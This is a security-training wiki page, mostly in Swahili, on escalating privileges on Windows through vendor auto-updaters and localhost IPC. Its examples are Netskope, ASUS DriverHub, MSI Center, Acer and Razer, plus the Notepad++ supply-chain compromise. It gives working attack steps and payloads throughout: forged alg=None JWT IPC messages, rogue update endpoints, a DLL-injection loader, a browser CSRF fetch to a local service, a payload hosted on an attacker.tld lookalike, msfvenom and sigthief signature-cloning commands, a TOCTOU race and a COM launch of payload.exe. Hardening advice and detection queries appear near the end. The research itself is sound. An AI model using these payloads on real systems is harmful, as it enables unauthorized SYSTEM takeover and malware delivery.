# Abusing Enterprise Auto-Updaters and Privileged IPC (e.g., Netskope, ASUS & MSI)

{{#include ../../banners/hacktricks-training.md}}

Ukurasa huu unatoa muhtasari wa aina ya Windows local privilege escalation chains zinazopatikana katika enterprise endpoint agents na updaters ambazo zinaonyesha uso wa IPC wenye upinzani mdogo na mtiririko wa update wenye ruhusa. Mfano wa kuwakilisha ni Netskope Client for Windows < R129 (CVE-2025-0309), ambapo mtumiaji mwenye ruhusa ndogo anaweza kulazimishwa kujiandikisha kwenye seva inayodhibitiwa na mshambuliaji kisha kupeleka MSI yenye hatari ambayo huduma ya SYSTEM inaisakinisha.

Mafikirio muhimu unaweza kutumia dhidi ya bidhaa zinazofanana:
- Tumia kwa ubadhirifu localhost IPC ya huduma yenye ruhusa ili kulazimisha re-enrollment au reconfiguration kwa seva ya mshambuliaji.
- Tekeleza endpoints za update za muuzaji, deliver Trusted Root CA haramu, na elekeza updater kwenye kifurushi kibaya kilicho “signed”.
- Kuepuka ukaguzi dhaifu wa signer (CN allow-lists), bendera za digest za hiari, na mali za MSI zisizo imara.
- Ikiwa IPC ime “encrypted”, tengeneza key/IV kutoka kwa vitambulisho vya mashine vinavyoweza kusomwa ulimwenguni vilivyohifadhiwa kwenye registry.
- Ikiwa huduma inalazimisha wapiga simu kwa image path/process name, inject kwenye process iliyoorodheshwa au anzisha moja kwa state suspended na bootstrap DLL yako kupitia mabadiliko madogo ya thread-context.

---
## 1) Kulazimisha kujiandikisha kwenye seva ya mshambulizi kupitia localhost IPC

Wakala wengi huleta process ya UI ya user-mode inayozungumza na huduma ya SYSTEM juu ya localhost TCP kwa kutumia JSON.

Imeonekana katika Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Exploit flow:
1) Tunga token ya JWT ya enrollment ambayo claims zake zinadhibiti backend host (mfano, AddonUrl). Tumia alg=None ili hakuna signature itakayohitajika.
2) Tuma ujumbe wa IPC unaoitisha amri ya provisioning pamoja na JWT yako na tenant name:
```json
{
"148": {
"idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
"tenantName": "TestOrg"
}
}
```
3) Huduma inaanza kuwasiliana na server yako haribifu kwa ajili ya enrollment/config, kwa mfano:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Notes:
- Ikiwa caller verification ni path/name-based, anzisha ombi kutoka kwa vendor binary iliyoorodheshwa (see §4).

---
## 2) Kudukua update channel ili kuendesha code kama SYSTEM

Mara client itakapozungumza na server yako, tekeleza endpoints zinazotarajiwa na ielekeze kwa attacker MSI. Taratibu za kawaida:

1) /v2/config/org/clientconfig → Rudisha JSON config yenye updater interval fupi sana, kwa mfano:
```json
{
"clientUpdate": { "updateIntervalInMin": 1 },
"check_msi_digest": false
}
```
2) /config/ca/cert → Rudisha cheti cha PEM CA. The service inasakinisha hiyo kwenye Local Machine Trusted Root store.
3) /v2/checkupdate → Toa metadata inayowelekeza kwa MSI mabaya na toleo bandia.

Kupita ukaguzi wa kawaida unaoonekana kwa uhalisia:
- Signer CN allow-list: service inaweza kuangalia tu Subject CN ikiwa ni “netSkope Inc” au “Netskope, Inc.”. Rogue CA yako inaweza kutoa leaf yenye CN hiyo na kusaini MSI.
- CERT_DIGEST property: jumuisha property ya MSI isiyo hatarishi yenye jina CERT_DIGEST. Hakuna utekelezaji wakati wa install.
- Optional digest enforcement: config flag (e.g., check_msi_digest=false) inazima uthibitisho wa ziada wa cryptographic.

Matokeo: service ya SYSTEM inasakinisha MSI yako kutoka
C:\ProgramData\Netskope\stAgent\data\*.msi
ikiwa ikitekelesha msimbo wowote kama NT AUTHORITY\SYSTEM.

---
## 3) Forging encrypted IPC requests (when present)

Kutoka R127, Netskope ilifunika IPC JSON ndani ya field encryptData iliyoonekana kama Base64. Reverse engineering ilionyesha AES na key/IV vinavyotokana na thamani za registry zinazoweza kusomwa na mtumiaji yeyote:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Washambuliaji wanaweza kuzalisha tena encryption na kutuma amri halali zilizofungwa kutoka kwa mtumiaji wa kawaida. Ushauri wa jumla: ikiwa agent ghafla “ina- encrypt” IPC yake, tafuta device IDs, product GUIDs, install IDs chini ya HKLM kama nyenzo.

---
## 4) Bypassing IPC caller allow-lists (path/name checks)

Huduma baadhi hujaribu ku-authenticate peer kwa kutatua PID ya muunganisho wa TCP na kulinganisha image path/name dhidi ya vendor binaries zilizoorodheshwa chini ya Program Files (e.g., stagentui.exe, bwansvc.exe, epdlp.exe).

Mbinu mbili za vitendo:
- DLL injection ndani ya mchakato ulioruhusiwa (e.g., nsdiag.exe) na ku-proxy IPC kutoka ndani yake.
- Spawn binary iliyoorodheshwa kwa hali suspended na bootstrap proxy DLL yako bila CreateRemoteThread (see §5) ili kutosheleza sheria za driver zinazozuia tampering.

---
## 5) Tamper-protection friendly injection: suspended process + NtContinue patch

Bidhaa mara nyingi huja na minifilter/OB callbacks driver (e.g., Stadrv) ili kuondoa haki hatarishi kutoka kwa handles za mchakato uliolindwa:
- Process: huondoa PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Thread: inazuia hadi THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Loader wa user-mode unaotegemewa unaoheshimu vizingiti hivi:
1) CreateProcess ya vendor binary kwa CREATE_SUSPENDED.
2) Pata handles unazoruhusiwa bado: PROCESS_VM_WRITE | PROCESS_VM_OPERATION kwenye process, na thread handle yenye THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (au tu THREAD_RESUME ikiwa unabadilisha code kwenye RIP inayojulikana).
3) Andika juu ya ntdll!NtContinue (au thunk nyingine ya mapema, inayojulikana kuwa ime-mapped) na stub ndogo inayoiita LoadLibraryW kwa path ya DLL yako, kisha kuruka kurudi.
4) ResumeThread ili kuamsha stub yako ndani ya process, ikipakia DLL yako.

Kwa sababu haukutumia PROCESS_CREATE_THREAD wala PROCESS_SUSPEND_RESUME kwenye process iliyolindwa (uliitengeneza mwenyewe), sera ya driver imetimizwa.

---
## 6) Practical tooling
- NachoVPN (Netskope plugin) inautomate rogue CA, malicious MSI signing, na kutumikia endpoints zinazohitajika: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.
- UpSkope ni custom IPC client inayofanya arbitrary (optionally AES-encrypted) IPC messages na inajumuisha suspended-process injection ili itokee kutoka kwa binary iliyoorodheshwa.

## 7) Fast triage workflow for unknown updater/IPC surfaces

Unapokabiliwa na endpoint agent mpya au suite ya “helper” ya motherboard, workflow ya haraka kwa kawaida inatosha kuamua kama unaangalia target yenye ahadi ya privesc:

1) Enumerate loopback listeners na kuirudisha kwa mchakato wa vendor:
```powershell
Get-NetTCPConnection -State Listen |
Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
Select-Object LocalAddress,LocalPort,OwningProcess,
@{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```
2) Orodhesha named pipes zinazowezekana:
```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```
3) Chimba registry-backed routing data zinazotumiwa na plugin-based IPC servers:
```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
Select-Object PSChildName
```
4) Toa majina ya endpoint, funguo za JSON, na command IDs kutoka kwa mteja wa user-mode kwanza. Packed Electron/.NET frontends mara nyingi leak the full schema:
```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
-Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```
If the target authenticates callers only by PID, image path, or process name, treat that as a speed bump rather than a boundary: injecting into the legitimate client, or making the connection from an allow-listed process, is often enough to satisfy the server’s checks. For named pipes specifically, [this page about client impersonation and pipe abuse](named-pipe-client-impersonation.md) covers the primitive in more depth.

---
## 1) Browser-to-localhost CSRF against privileged HTTP APIs (ASUS DriverHub)

DriverHub ships a user-mode HTTP service (ADU.exe) on 127.0.0.1:53000 that expects browser calls coming from https://driverhub.asus.com. The origin filter simply performs `string_contains(".asus.com")` over the Origin header and over download URLs exposed by `/asus/v1.0/*`. Any attacker-controlled host such as `https://driverhub.asus.com.attacker.tld` therefore passes the check and can issue state-changing requests from JavaScript. See [CSRF basics](../../pentesting-web/csrf-cross-site-request-forgery.md) for additional bypass patterns.

Mtiririko wa vitendo:
1) Sajili domain inayojumuisha `.asus.com` na uweke ukurasa wa wavuti hatari huko.
2) Tumia `fetch` au XHR kuitisha privileged endpoint (mfano, `Reboot`, `UpdateApp`) kwenye `http://127.0.0.1:53000`.
3) Tuma JSON body inayotarajiwa na handler – packed frontend JS inaonyesha schema hapa chini.
```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```
Hata PowerShell CLI iliyoonyeshwa hapa chini inafanikiwa wakati Origin header imefekiwa kuwa na thamani ya kuaminika:
```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
-Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
-Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```
Any browser visit to the attacker site therefore becomes a 1-click (or 0-click via `onload`) local CSRF that drives a SYSTEM helper.

---
## 2) Insecure code-signing verification & certificate cloning (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` downloads arbitrary executables defined in the JSON body and caches them in `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Download URL validation reuses the same substring logic, so `http://updates.asus.com.attacker.tld:8000/payload.exe` is accepted. After download, ADU.exe merely checks that the PE contains a signature and that the Subject string matches ASUS before running it – no `WinVerifyTrust`, no chain validation.

To weaponize the flow:
1) Create a payload (e.g., `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Clone ASUS’s signer into it (e.g., `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Host `pwn.exe` on a `.asus.com` lookalike domain and trigger UpdateApp via the browser CSRF above.

Because both the Origin and URL filters are substring-based and the signer check only compares strings, DriverHub pulls and executes the attacker binary under its elevated context.

---
## 1) TOCTOU inside updater copy/execute paths (MSI Center CMD_AutoUpdateSDK)

MSI Center’s SYSTEM service exposes a TCP protocol where each frame is `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. The core component (Component ID `0f 27 00 00`) ships `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Its handler:
1) Copies the supplied executable to `C:\Windows\Temp\MSI Center SDK.exe`.
2) Verifies the signature via `CS_CommonAPI.EX_CA::Verify` (certificate subject must equal “MICRO-STAR INTERNATIONAL CO., LTD.” and `WinVerifyTrust` succeeds).
3) Creates a scheduled task that runs the temp file as SYSTEM with attacker-controlled arguments.

The copied file is not locked between verification and `ExecuteTask()`. An attacker can:
- Send Frame A pointing to a legitimate MSI-signed binary (guarantees the signature check passes and the task is queued).
- Race it with repeated Frame B messages that point to a malicious payload, overwriting `MSI Center SDK.exe` just after verification completes.

When the scheduler fires, it executes the overwritten payload under SYSTEM despite having validated the original file. Reliable exploitation uses two goroutines/threads that spam CMD_AutoUpdateSDK until the TOCTOU window is won.

---
## 2) Abusing custom SYSTEM-level IPC & impersonation (MSI Center + Acer Control Centre)

### MSI Center TCP command sets
- Every plugin/DLL loaded by `MSI.CentralServer.exe` receives a Component ID stored under `HKLM\SOFTWARE\MSI\MSI_CentralServer`. The first 4 bytes of a frame select that component, allowing attackers to route commands to arbitrary modules.
- Plugins can define their own task runners. `Support\API_Support.dll` exposes `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` and directly calls `API_Support.EX_Task::ExecuteTask()` with **no signature validation** – any local user can point it at `C:\Users\<user>\Desktop\payload.exe` and get SYSTEM execution deterministically.
- Sniffing loopback with Wireshark or instrumenting the .NET binaries in dnSpy quickly reveals the Component ↔ command mapping; custom Go/ Python clients can then replay frames.

### Acer Control Centre named pipes & impersonation levels
- `ACCSvc.exe` (SYSTEM) exposes `\\.\pipe\treadstone_service_LightMode`, and its discretionary ACL allows remote clients (e.g., `\\TARGET\pipe\treadstone_service_LightMode`). Sending command ID `7` with a file path invokes the service’s process-spawning routine.
- The client library serializes a magic terminator byte (113) along with args. Dynamic instrumentation with Frida/`TsDotNetLib` (see [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md) for instrumentation tips) shows that the native handler maps this value to a `SECURITY_IMPERSONATION_LEVEL` and integrity SID before calling `CreateProcessAsUser`.
- Swapping 113 (`0x71`) for 114 (`0x72`) drops into the generic branch that keeps the full SYSTEM token and sets a high-integrity SID (`S-1-16-12288`). The spawned binary therefore runs as unrestricted SYSTEM, both locally and cross-machine.
- Combine that with the exposed installer flag (`Setup.exe -nocheck`) to stand up ACC even on lab VMs and exercise the pipe without vendor hardware.

These IPC bugs highlight why localhost services must enforce mutual authentication (ALPC SIDs, `ImpersonationLevel=Impersonation` filters, token filtering) and why every module’s “run arbitrary binary” helper must share the same signer verifications.

---
## 3) COM/IPC “elevator” helpers backed by weak user-mode validation (Razer Synapse 4)

Razer Synapse 4 added another useful pattern to this family: a low-privileged user can ask a COM helper to launch a process through `RzUtility.Elevator`, while the trust decision is delegated to a user-mode DLL (`simple_service.dll`) rather than being enforced robustly inside the privileged boundary.

Observed exploitation path:
- Instantiate the COM object `RzUtility.Elevator`.
- Call `LaunchProcessNoWait(<path>, "", 1)` to request an elevated launch.
- In the public PoC, the PE-signature gate inside `simple_service.dll` is patched out before issuing the request, allowing an arbitrary attacker-chosen executable to be launched.

Minimal PowerShell invocation:
```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```
General takeaway: unaporudisha “helper” suites, usisite kwa localhost TCP au named pipes. Angalia darasa za COM zenye majina kama `Elevator`, `Launcher`, `Updater`, au `Utility`, kisha thibitisha ikiwa huduma yenye ruhusa inathibitisha binary lengwa yenyewe au inatumia tu matokeo yaliyohesabiwa na DLL ya mteja wa user-mode inayoweza kubadilishwa. Mfano huu unaenea zaidi ya Razer: muundo wowote uliogawanyika ambapo broker mwenye ruhusa kubwa unatumia uamuzi wa kuruhusu/kukanusha kutoka upande wa ruhusa ndogo ni uso linaloweza kuwa la privesc.

---
## Utekaji wa mnyororo wa ugavi kwa mbali kupitia uhakiki dhaifu wa updater (WinGUp / Notepad++)

Updaters za zamani za Notepad++ zinazotumia WinGUp hazikutathmini kabisa uhalali wa masasisho. Walipo wavamizi wakapata udhibiti wa mtoa huduma wa kuhifadhi server ya masasisho, wangeweza kuharibu manifest ya XML na kuelekeza wateja waliochaguliwa tu kwa URL za mashambulizi. Kwa sababu mteja ulikubali majibu yoyote ya HTTPS bila kutekeleza pamoja mnyororo wa cheti kilichoaminika na sahihi ya PE, waathirika walipakua na kutekeleza NSIS `update.exe` iliyotekwa.

Mtiririko wa uendeshaji (hakuna exploit ya eneo la ndani inahitajika):
1. **Infrastructure interception**: kuharibu CDN/mtoa huduma wa hosting na kujibu vikaguzi vya masasisho kwa metadata ya mshambuliaji inayorejea kwenye URL ya upakuaji yenye madhara.
2. **Trojanized NSIS**: installer inapakia/kutekeleza payload na kutumia vibaya mnyororo miwili ya utekelezaji:
- **Bring-your-own signed binary + sideload**: jumuisha `BluetoothService.exe` iliyo na saini ya Bitdefender na weka `log.dll` ya uharibifu katika njia yake ya utafutaji. Wakati binary iliyo na saini inapokimbia, Windows inafanya sideload ya `log.dll`, ambayo inaifungua na kuipakia kwa njia ya reflective backdoor ya Chrysalis (Warbird-protected + API hashing ili kuzuia ugunduzi wa static).
- **Scripted shellcode injection**: NSIS inatekeleza script ya Lua iliyochapishwa ambayo inatumia Win32 APIs (mfano, `EnumWindowStationsW`) kuingiza shellcode na kuweka hatua ya Cobalt Strike Beacon.

Mafunzo ya kuimarisha/ugunduzi kwa updater yoyote ya auto:
- Tekeleza **certificate + signature verification** ya installer iliyopakuliwa (pin vendor signer, kataza CN/chain zisizolingana) na saini manifesto ya masasisho yenyewe (mfano, XMLDSig). Zuia redirects zinazoendeshwa na manifest isipokuwa zimetathibitishwa.
- Chukulia **BYO signed binary sideloading** kama pivot ya ugunduzi baada ya upakuaji: toa tahadhari wakati EXE iliyo na saini ya vendor inapakia DLL iliyo na jina kutoka nje ya njia yake ya usakinishaji ya kawaida (mfano, Bitdefender ikipakia `log.dll` kutoka Temp/Downloads) na wakati updater inaweka/kutekeleza installers kutoka temp zenye saini zisizo za vendor.
- Fuatilia **malware-specific artifacts** zinazojitokeza katika mnyororo huu (zifaazo kama pivots za jumla): mutex `Global\Jdhfv_1.0.1`, maandishi yasiyo ya kawaida ya `gup.exe` kwa `%TEMP%`, na hatua za kuingizwa kwa shellcode zilizoendeshwa na Lua.

<details>
<summary>Cortex XDR XQL – Bitdefender-signed EXE sideloading <code>log.dll</code> (T1574.001)</summary>
```sql
// Identifies Bitdefender-signed processes loading log.dll outside vendor paths
config case_sensitive = false
| dataset = xdr_data
| fields actor_process_signature_vendor, actor_process_signature_product, action_module_path, actor_process_image_path, actor_process_image_sha256, agent_os_type, event_type, event_id, agent_hostname, _time, actor_process_image_name
| filter event_type = ENUM.LOAD_IMAGE and agent_os_type = ENUM.AGENT_OS_WINDOWS
| filter actor_process_signature_vendor contains "Bitdefender SRL" and action_module_path contains "log.dll"
| filter actor_process_image_path not contains "Program Files\\Bitdefender"
| filter not actor_process_image_name in ("eps.rmm64.exe", "downloader.exe", "installer.exe", "epconsole.exe", "EPHost.exe", "epintegrationservice.exe", "EPPowerConsole.exe", "epprotectedservice.exe", "DiscoverySrv.exe", "epsecurityservice.exe", "EPSecurityService.exe", "epupdateservice.exe", "testinitsigs.exe", "EPHost.Integrity.exe", "WatchDog.exe", "ProductAgentService.exe", "EPLowPrivilegeWorker.exe", "Product.Configuration.Tool.exe", "eps.rmm.exe")
```
</details>

<details>
<summary>Cortex XDR XQL – <code>gup.exe</code> inayozindua msakinishaji usio wa Notepad++</summary>
```sql
config case_sensitive = false
| dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START and _product = "XDR agent" and _vendor = "PANW"
| filter lowercase(actor_process_image_name) = "gup.exe" and actor_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN ) and action_process_signature_status not in (null, ENUM.UNSUPPORTED, ENUM.FAILED_TO_OBTAIN )
| filter lowercase(action_process_image_name) ~= "(npp[\.\d]+?installer)"
| filter action_process_signature_status != ENUM.SIGNED or lowercase(action_process_signature_vendor) != "notepad++"
```
</details>

Mifano hii yanatumika kwa updater yoyote ambayo inakubali unsigned manifests au kushindwa kupiga pin installer signers—network hijack + malicious installer + BYO-signed sideloading hupelekea remote code execution chini ya mwonekano wa “trusted” updates.

---
## Marejeo
- [Advisory – Netskope Client for Windows – Local Privilege Escalation via Rogue Server (CVE-2025-0309)](https://blog.amberwolf.com/blog/2025/august/advisory---netskope-client-for-windows---local-privilege-escalation-via-rogue-server/)
- [Netskope Security Advisory NSKPSA-2025-002](https://www.netskope.com/resources/netskope-resources/netskope-security-advisory-nskpsa-2025-002)
- [NachoVPN – Netskope plugin](https://github.com/AmberWolfCyber/NachoVPN)
- [UpSkope – Netskope IPC client/exploit](https://github.com/AmberWolfCyber/UpSkope)
- [NVD – CVE-2025-0309](https://nvd.nist.gov/vuln/detail/CVE-2025-0309)
- [SensePost – Pwning ASUS DriverHub, MSI Center, Acer Control Centre and Razer Synapse 4](https://sensepost.com/blog/2025/pwning-asus-driverhub-msi-center-acer-control-centre-and-razer-synapse-4/)
- [sensepost/bloatware-pwn PoCs](https://github.com/sensepost/bloatware-pwn)
- [Unit 42 – Nation-State Actors Exploit Notepad++ Supply Chain](https://unit42.paloaltonetworks.com/notepad-infrastructure-compromise/)
- [Notepad++ – hijacked infrastructure incident update](https://notepad-plus-plus.org/news/hijacked-incident-info-update/)

{{#include ../../banners/hacktricks-training.md}}
